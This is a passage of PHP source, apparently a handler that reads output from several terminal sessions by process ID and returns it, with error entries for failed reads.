                $terminals[$id] = $handleSession('read', ['processId' => (string)$id], 65536, true);
            } catch (Exception $error) {
                $terminals[$id] = ['code' => 500, 'instanceId' => $instanceId, 'msg' => $error->getMessage()];
            }
        }
        return ['code' => 200, 'instanceId' => $instanceId, 'terminals' => (object)$terminals];
    }
];
